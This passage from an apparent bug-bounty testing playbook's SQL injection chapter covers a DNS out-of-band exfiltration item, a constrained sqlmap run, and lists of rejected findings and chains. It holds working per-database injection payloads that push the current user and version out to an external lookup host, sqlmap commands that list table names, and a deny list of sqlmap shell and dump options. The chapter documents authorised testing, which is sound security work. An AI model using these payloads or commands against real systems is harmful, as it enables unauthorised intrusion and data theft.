  needs a database function that opens a network connection, which exists on SQL Server (any login may call
  `xp_dirtree`), Oracle (`UTL_INADDR`, subject to the network ACL), MySQL and MariaDB on Windows hosts only
  (`LOAD_FILE` with a UNC path), and PostgreSQL only when the `dblink` extension is installed. No title in the
  report library names this channel; the two reports cited are stacked blind injections, the setting where it is
  used.
- **Test:** make the database resolve `<hex of the value>.<label>.$OOB`. The value is hex-encoded and cut to 30
  bytes so that it fits a 63-character DNS label. DNS only: do not run an SMB or HTTP listener that captures the
  database host's authentication, and do not use functions that run operating-system commands (`xp_cmdshell`,
  `COPY ... TO PROGRAM`).
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-013"; mkdir -p "$D"; U="$T/api/track"; P=ref
  cat > "$D/payloads.txt" <<'EOF'
  mssql: x'; DECLARE @q varchar(200); SET @q='\\'+CONVERT(varchar(60),CONVERT(varbinary(30),SYSTEM_USER),2)+'.u.sql013.OOBHOST\a'; EXEC master..xp_dirtree @q-- -
  mssqlv: x'; DECLARE @q varchar(200); SET @q='\\'+CONVERT(varchar(60),CONVERT(varbinary(30),@@version),2)+'.v.sql013.OOBHOST\a'; EXEC master..xp_dirtree @q-- -
  oracle: x'||(SELECT UTL_INADDR.GET_HOST_ADDRESS(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(user,1,30)))||'.u.sql013.OOBHOST') FROM dual)||'
  mysqlwin: x' AND LOAD_FILE(CONCAT('\\\\',HEX(SUBSTRING(current_user(),1,30)),'.u.sql013.OOBHOST\\a')) IS NULL-- -
  pgdblink: x'||(SELECT dblink_connect('host='||encode(convert_to(substring(current_user::text,1,30),'UTF8'),'hex')||'.u.sql013.OOBHOST user=a dbname=a connect_timeout=2'))||'
  EOF
  send() { local pl; pl=$(sed -n "s/^ *$1: //p" "$D/payloads.txt" | sed "s/OOBHOST/$OOB/g")
           curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$pl" "$U" -o /dev/null -w "%{http_code} %{time_total}  $1\n"
           date -u +"%FT%TZ sent $1" >> "$D/sent.log"; sleep 2; }
  # control first: the bare host name as an ordinary value must NOT be looked up
  curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=control.sql013.$OOB" "$U" -o /dev/null -w '%{http_code} control\n'; sleep 2
  send mssql; send oracle; send mysqlwin; send pgdblink          # only the ones that fit the DBMS; mssqlv after mssql answers
  # read the interaction log (interactsh-client -json -o "$D/oob.json"), then decode the first label
  jq -r 'select(."full-id"|test("sql013")) | [.timestamp, ."remote-address", ."full-id"] | @tsv' "$D/oob.json"
  echo 6170705f7573657240 | xxd -r -p; echo
  ```
  The payloads assume a quoted string context; for a stored value (SQL-008) or a header (SQL-007) put the same
  text where that item puts its payload. `xp_dirtree` and `IF`/`DECLARE` need a second statement, which SQL
  Server drivers normally allow.
- **Proof:** the DNS query for `<hex>.u.sql013.$OOB` in the interaction log, timestamped just after the request
  in `sent.log`, the label decoded to the current user, the resolver's address, and no query for the control
  name. One further query carrying the first 30 bytes of the version is enough.
- **Not a finding when:** the control name is looked up as well: something in the path resolves every host name it
  sees (a WAF, a log scanner, a URL reputation service). The query arrives from a security vendor's resolver
  minutes or hours later (`third-party`). The response shows `ORA-24247` (network access denied by the access
  control list) or "could not establish connection" without any lookup: the function ran, which proves the
  injection in-band (SQL-002), and the channel is closed. No lookup arrives: outbound DNS is filtered, which
  says nothing either way.
- **Escalate:** nothing further is needed for the report. Say that the UNC path also makes a Windows database host
  attempt SMB authentication to the named host, and that this was not captured. The database host as a blind
  fetcher of internal addresses is SSR-010 territory: describe it.

### SQL-014 · A targeted sqlmap run on the confirmed parameter reproduces the injection and lists the table names of the application schema

| | |
|---|---|
| **Severity** | High standalone with banner, current user and the application schema's table names; Critical when the entry point needs no account or the names show credential, session or payment tables on production |
| **Requires** | — |
| **Excluded by** | automated |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | SQL Injection · CWE-89 |
| **Prior art** | #531051, #361623, #2633959 |

- **Where:** No further gate, but only after an injection point was confirmed by hand in SQL-001 to SQL-011: one
  request, one parameter, a known technique and DBMS. Never as a discovery scanner over the crawl (`--crawl`,
  `--forms`, `-m`, `-g`): that is what the `automated` exclusion and most rate rules are about. The impact a
  triager weighs is which data the injection reaches (#361623 argued it from the database names it disclosed;
  #531051 from the kind of database behind the endpoint): the table names of the application's own schema state
  that without reading a row.
- **Test:** sqlmap automates the per-character loop you already ran. Constrain it to what you know: the parameter
  (`-p`, or `*` at the injection point), the technique (`--technique`), the DBMS (`--dbms`), level 1 and risk 1,
  one thread, a delay between requests, the true-response string. Enumerate identity first, then table names of
  the current database, and nothing else.
- **How:**
  ```bash
  D="$E/evidence/$H/SQL-014"; mkdir -p "$D"; P=id
  # the request confirmed by hand, with the programme's headers and A's session, as a raw request file
  { echo "GET /api/items?id=7&page=1 HTTP/1.1"; echo "Host: $H"
    for i in "${!HDR[@]}"; do [ "${HDR[$i]}" = -A ] && echo "User-Agent: ${HDR[$((i+1))]}"; [ "${HDR[$i]}" = -H ] && echo "${HDR[$((i+1))]}"; done
    cat "$E/accounts/A.headers"; echo "Accept: */*"; echo; } > "$D/req.txt"
  OPTS=(-r "$D/req.txt" --force-ssl -p "$P" --batch --dbms=mysql --technique=B --level 1 --risk 1 --threads 1
        --delay "$(awk "BEGIN{w=1/$RATE; print (w<1)?1:w}")" --timeout 15 --retries 1 --string='"total":1'
        --output-dir "$D/sqlmap" -v 3)
  sqlmap "${OPTS[@]}" --banner --current-user --current-db --is-dba 2>&1 | tee "$D/run1.log"
  # only after run 1 identified the point: table NAMES of the current database
  DB=$(grep -aoP "current database: '\K[^']+" "$D/run1.log" | tail -1)
  sqlmap "${OPTS[@]}" -D "$DB" --tables 2>&1 | tee "$D/run2.log"
  ```
  ```text
  adapt            time-blind: --technique=T --time-sec 2     error or UNION output: --technique=EU
                   ORDER BY or LIMIT position: --level 2      JSON value, path segment, header, cookie: put * at the point and drop -p
                   known closing: --prefix="%'" --suffix="-- -"       WAF (SQL-012): the one --tamper script that reproduces the passing spelling
  never            --dump  --dump-all  --all  --passwords  --schema  --columns  --search  --sql-query  --sql-shell
                   --os-shell  --os-cmd  --os-pwn  --priv-esc  --file-read  --file-write  --udf-inject  --reg-read
                   --risk 2 or 3 (heavy time payloads; OR-based payloads that rewrite UPDATE and DELETE statements)
                   --level above 2  --threads above 1  --random-agent (it drops the programme's User-Agent)  --crawl  --forms
  by hand, in-band (SQL-002), names only
  MySQL, MariaDB   UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()
  PostgreSQL       UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema=current_schema()
  SQL Server       UNION SELECT NULL,(SELECT STRING_AGG(name,',') FROM sys.tables),NULL
  Oracle           UNION SELECT NULL,(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables),NULL FROM dual
  ```
- **Proof:** from `run1.log`: sqlmap's injection-point block (parameter, type, title, payload), the banner, the
  current user, the current database and the DBA flag. From `run2.log`: the list of table names. Add one payload
  from the log replayed with `curl`, with its false twin, so that the report reproduces without sqlmap, and the
  exact command line. No rows, no column values, no password hashes.
- **Not a finding when:** sqlmap prints "heuristic (basic) test shows that parameter might be injectable" or
  "appears to be injectable" and then "false positive or unexploitable injection point detected". A time-based
  hit on an endpoint with jitter returns an empty or garbled banner. The run cannot be reproduced by replaying
  one payload by hand. The programme's policy forbids automated tools: the item is excluded, and the manual read
  in SQL-002 to SQL-004 already carries the report.
- **Escalate:** stop here. A DBA user, file privileges or stacked queries are stated as facts with their
  consequence in one sentence each; reading files, writing data and running commands through the database are
  out of bounds. Table names that hold serialized objects or sessions point to DSR-007 and DSR-010 as a chain to
  describe (#361341, #1842674), not to perform.

## Graveyard

- **A database error message with no control over the statement** (`version-disclosure`). A 500 on one quote, a
  stack trace with the query, `invalid input syntax for type integer: "7'"`. #237597 and #225098 are SQL
  exceptions disclosed without a bounty. It becomes a finding only with a true and false pair or a read.
- **Scanner output without a manual proof** (`automated`). "sqlmap says the parameter might be injectable", a
  nuclei or Burp time-based hit that does not repeat. Triage asks for one request and its false twin.
- **A single slow response.** A delay that does not repeat, does not scale and has no false twin is noise.
- **A boolean pair with nothing read.** Most triagers answer "needs more info" until the version or current user
  is shown. Finish SQL-003 before filing.
- **Wildcards in a search box.** `%` and `_` matching more rows in a search is search. Heavy patterns and
  `BENCHMARK`-style payloads that load the database are denial of service (`dos`).
- **Injection into Solr, Elasticsearch, MongoDB or another non-SQL query language** filed as SQL injection. It
  belongs to the NSQ chapter and is rated on what that language can reach: #952501 was judged low impact because
  only a filter clause could be changed (it still paid $2,000); #844428 paid $100.
- **A SQL console that is the feature.** An admin "SQL query form" (#149279), a reporting tool that runs SQL for
  authorised users, a database client behind login. It is a finding only when someone without that right can
  reach it, which is access control (#687908 reached PgHero through an origin address).
- **An outdated plugin or product with a published SQL injection, reported from the version alone**
  (`known-cve`). Exploited on the programme's own host it pays (#273946, $4,500; #125932, $3,000); a version
  string does not. On a service the organisation does not operate it is `third-party` (#206872 was paid, with the
  note that the host sat outside the company's infrastructure).
- **Local SQL injection in a mobile app's content provider** (#291764, $150; #518669, $100). It needs a malicious
  app on the same device and is not a web finding.
- **One root cause reported once per parameter or per endpoint.** Ten parameters of one script that share one
  query builder are one report; the rest close as duplicates. Separate scripts with separate queries were paid
  separately: #836079 and #838855 are the same bug on two endpoints, $2,000 each.
- **ORM lookups that filter on hidden fields without changing SQL text.** Real, and filed under access control
  (BAC-009), not here.
- **Development or empty databases.** A confirmed injection on a development service with no user data is paid
  at the bottom of the table (#923020, $250).

## Chains

- SQL-012 → every other item: the WAF bypass restores a blocked proof and inherits that item's level.
- SQL-001, SQL-005, SQL-006, SQL-009, SQL-010, SQL-011 (an injection point) → SQL-002, SQL-003 or SQL-004 (a read)
  → SQL-014 (table names): the full proof.
- SQL-007, SQL-008 → SQL-013: injections whose statement runs out of sight are proven by a DNS lookup.
- INF-006, INF-007, INF-009 (debug pages and errors that print the statement) → SQL-001, SQL-002: the exact
  context and DBMS, without guessing.
- GQL-001 or GQL-002 (the schema) → SQL-009: the list of arguments to test. GQL-009 covers the non-SQL back ends
  of the same arguments.
- JWT-005 (`kid` reaching a query) and XSS-012 (headers stored and rendered) share their entry points with
  SQL-007.
- BAC-009: sort and filter parameters that are safe against injection can still order or filter by fields the
  caller must not see.
- SQL (read access to reset-token, session or API-key tables) → AUT: account takeover without interaction.
  Describe it from the table names; do not read the rows.
- SQL (write access, stacked queries) → DSR-007, DSR-010 and the RCE chapter: a serialized value planted in a
  table, or command execution through the database (#361341, #1842674, #816254, #592400, #1339430). Described,
  never performed.

## Sources

- `kb/reports/sqli.md` and `kb/reports/all/sqli.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"SQL injection"}`, `find_bypasses {"protection":"waf sql injection"}`, `find_payloads {"topic":"SQL Injection"}`.
- PortSwigger Web Security Academy, SQL injection, and its SQL injection cheat sheet (per-DBMS syntax); OWASP
  WSTG-INPV-05; PayloadsAllTheThings, SQL Injection.
- sqlmap user's manual (`sqlmap -hh`): `-r`, `-p`, `--technique`, `--level`, `--risk`, `--delay`, `--string`,
  `--prefix`, `--suffix`, `--tamper`.
- rails-sqli.org (ActiveRecord methods that take raw SQL); the Django, Rails and Laravel security release notes
  for ORM injections.
- Claroty Team82, "{JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF" (2022).
- Flatt Security, "Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql" (2022).
